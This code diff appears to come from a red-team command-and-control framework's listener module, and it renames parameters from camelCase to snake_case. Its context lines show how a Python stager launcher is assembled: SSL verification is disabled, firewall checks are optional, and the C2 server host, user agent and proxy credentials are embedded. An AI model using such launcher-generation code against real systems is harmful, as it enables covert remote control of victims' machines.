@@ -78,13 +78,13 @@ class Listener:
         encode=True,
         obfuscate=False,
         obfuscation_command="",
-        userAgent="default",
+        user_agent="default",
         proxy="default",
-        proxyCreds="default",
-        stagerRetries="0",
+        proxy_creds="default",
+        stager_retries="0",
         language=None,
-        safeChecks="",
-        listenerName=None,
+        safe_checks="",
+        listener_name=None,
         bypasses: list[str] = None,
     ):
         """
@@ -120,19 +120,19 @@ class Listener:
                     launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
 
                 try:
-                    if safeChecks.lower() == "true":
+                    if safe_checks.lower() == "true":
                         launcherBase += listener_util.python_safe_checks()
                 except Exception as e:
-                    p = f"{listenerName}: Error setting LittleSnitch in stager: {str(e)}"
+                    p = f"{listener_name}: Error setting LittleSnitch in stager: {str(e)}"
                     log.error(p, exc_info=True)
 
-                if userAgent.lower() == "default":
+                if user_agent.lower() == "default":
                     profile = listenerOptions["DefaultProfile"]["Value"]
-                    userAgent = profile.split("|")[1]
+                    user_agent = profile.split("|")[1]
 
                 launcherBase += "import urllib.request;\n"
-                launcherBase += "UA='%s';" % (userAgent)
-                launcherBase += f"server='{host}';t='{stage0}';hop='{listenerName}';"
+                launcherBase += "UA='%s';" % (user_agent)
+                launcherBase += f"server='{host}';t='{stage0}';hop='{listener_name}';"
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(
@@ -177,13 +177,13 @@ class Listener:
                             + "'});\n"
                         )
 
-                    if proxyCreds != "none":
-                        if proxyCreds == "default":
+                    if proxy_creds != "none":
+                        if proxy_creds == "default":
                             launcherBase += "o = urllib.request.build_opener(proxy);\n"
                         else:
                             launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
-                            username = proxyCreds.split(":")[0]
-                            password = proxyCreds.split(":")[1]
+                            username = proxy_creds.split(":")[0]
+                            password = proxy_creds.split(":")[1]
                             launcherBase += (
                                 "proxy_auth_handler.add_password(None,'"
                                 + proxy
